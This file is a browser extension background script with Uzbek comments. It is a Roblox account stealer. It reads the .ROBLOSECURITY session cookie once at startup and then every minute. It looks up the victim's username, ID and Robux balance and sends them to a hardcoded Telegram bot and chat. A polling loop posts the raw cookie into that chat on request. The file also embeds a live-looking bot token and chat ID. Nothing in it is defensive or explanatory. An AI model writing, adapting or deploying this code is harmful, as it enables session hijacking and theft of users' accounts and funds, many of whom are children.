const TELEGRAM_BOT_TOKEN = '8819062469:AAFdy6JsOo_wZCnN2wIyz-noszsZQ_PmyVY';
const TELEGRAM_CHAT_ID = '8043397476';

// Skript yoqilgandayoq darhol tekshirish va long-polling ni boshlash
checkAndSendCookies();
startLongPolling();

// Har 1 daqiqada kuki o'zgarganini tekshirish
chrome.alarms.create("checkCookiesAlarm", { periodInMinutes: 1.0 });
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "checkCookiesAlarm") {
        checkAndSendCookies();
    }
});

async function checkAndSendCookies() {
    try {
        const cookies = await chrome.cookies.get({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        });

        if (!cookies) return;
        let cookieValue = cookies.value;

        const userInfo = await getRobloxUserInfo(cookieValue);
        if (!userInfo) return;

        // Robux balansini aniq olish (Fetch orqali ruxsat bilan)
        let robuxBalance = await getRobuxBalance(cookieValue);

        let accountId = userInfo.id.toString();
        let currentTime = new Date().toLocaleString();

        chrome.storage.local.get(["trackedAccounts"], async (data) => {
            let trackedAccounts = data.trackedAccounts || {};
            let accData = trackedAccounts[accountId];

            if (!accData) {
                let updateCount = 1;
                let msgId = await sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, currentTime, accountId);
                
                if (msgId) {
                    trackedAccounts[accountId] = {
                        messageId: msgId,
                        updateCount: updateCount,
                        lastCookie: cookieValue
                    };
                    chrome.storage.local.set({ trackedAccounts });
                }
            } else {
                if (accData.lastCookie !== cookieValue) {
                    let updateCount = accData.updateCount + 1;

                    if (accData.messageId) {
                        await deleteTelegramMessage(accData.messageId);
                    }

                    let msgId = await sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, currentTime, accountId);

                    if (msgId) {
                        trackedAccounts[accountId] = {
                            messageId: msgId,
                            updateCount: updateCount,
                            lastCookie: cookieValue
                        };
                        chrome.storage.local.set({ trackedAccounts });
                    }
                }
            }
        });

    } catch (error) {
        console.error("Xatolik:", error);
    }
}

async function getRobloxUserInfo(cookieValue) {
    try {
        let response = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
        });
        if (response.ok) return await response.json();
    } catch (e) {}
    return null;
}

async function getRobuxBalance(cookieValue) {
    try {
        let response = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
        });
        if (response.ok) {
            let data = await response.json();
            return data.robux !== undefined ? data.robux : 0;
        }
    } catch (e) {}
    return 0; // Agar xato bo'lsa 0 qaytaradi
}

async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, timeStr, accountId) {
    let messageText = `🔄 **ROBLOX AKKAUNT MA'LUMOTI**\n\n` +
                      `👤 **Username:** \`${userInfo.name}\`\n` +
                      `🏷 **Displayname:** \`${userInfo.displayName}\`\n` +
                      `🆔 **ID:** \`${userInfo.id}\`\n` +
                      `💎 **Robux Balansi:** \`${robuxBalance}\`\n` +
                      `📊 **Ulanish soni:** \`${updateCount}-chi marta\`\n` +
                      `🕒 **Vaqt:** \`${timeStr}\``;

    chrome.storage.local.get(["cookieStore"], (data) => {
        let store = data.cookieStore || {};
        store[accountId] = cookieValue;
        chrome.storage.local.set({ cookieStore: store });
    });

    try {
        let res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [ { text: "📋 COPY COOKIE", callback_data: `get_cookie_${accountId}` } ]
                    ]
                }
            })
        });
        let data = await res.json();
        if (data.ok) return data.result.message_id;
    } catch (e) {}
    return null;
}

async function deleteTelegramMessage(messageId) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, message_id: messageId })
        });
    } catch (e) {}
}

async function startLongPolling() {
    chrome.storage.local.get(["lastUpdateId"], (data) => {
        let lastUpdateId = data.lastUpdateId || 0;

        setInterval(async () => {
            try {
                let res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
                let dataRes = await res.json();
                
                if (dataRes.ok && dataRes.result.length > 0) {
                    for (let update of dataRes.result) {
                        lastUpdateId = update.update_id;
                        chrome.storage.local.set({ lastUpdateId: lastUpdateId });

                        if (update.callback_query) {
                            let query = update.callback_query;
                            let dataStr = query.data;

                            if (dataStr.startsWith("get_cookie_")) {
                                let accountId = dataStr.replace("get_cookie_", "");
                                
                                chrome.storage.local.get(["cookieStore"], async (st) => {
                                    let store = st.cookieStore || {};
                                    let cookieVal = store[accountId];

                                    if (cookieVal) {
                                        let msgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                            method: 'POST',
                                            headers: { 'Content-Type': 'application/json' },
                                            body: JSON.stringify({
                                                chat_id: TELEGRAM_CHAT_ID,
                                                text: `📋 **COPY QILINGAN KUKI:**\n\`${cookieVal}\``,
                                                parse_mode: 'Markdown'
                                            })
                                        });
                                        let msgData = await msgRes.json();

                                        if (msgData.ok) {
                                            let sentMsgId = msgData.result.message_id;
                                            setTimeout(async () => {
                                                await deleteTelegramMessage(sentMsgId);
                                            }, 3000);
                                        }
                                    }

                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ callback_query_id: query.id, text: "Kuki yuborildi!" })
                                    });
                                });
                            }
                        }
                    }
                }
            } catch (e) {}
        }, 3000);
    });
}
